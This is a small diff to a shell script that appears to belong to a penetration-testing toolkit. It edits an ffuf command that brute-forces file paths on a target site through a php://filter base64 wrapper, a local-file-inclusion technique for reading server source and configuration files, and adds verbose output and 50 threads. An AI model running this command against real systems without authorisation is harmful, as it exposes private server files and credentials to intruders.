@@ -20,5 +20,5 @@ FILE_WORDLIST=${form_data["file_wordlist"]}
 EXT_WORDLIST=${form_data["extension_wordlist"]}
 PATH_PREFIX=${form_data["path_prefix"]}
 
-execute_command "ffuf -w ${DIR_WORDLIST}:DIR -w ${FILE_WORDLIST}:FILE -w ${EXT_WORDLIST}:EXT -u '${WEBSITE}php://filter/read=convert.base64-encode/resource=${PATH_PREFIX}DIR/FILE.EXT' -fs 0"
+execute_command "ffuf -w ${DIR_WORDLIST}:DIR -w ${FILE_WORDLIST}:FILE -w ${EXT_WORDLIST}:EXT -u '${WEBSITE}php://filter/read=convert.base64-encode/resource=${PATH_PREFIX}DIR/FILE.EXT' -v -t 50 -fs 0"
 create_new_line
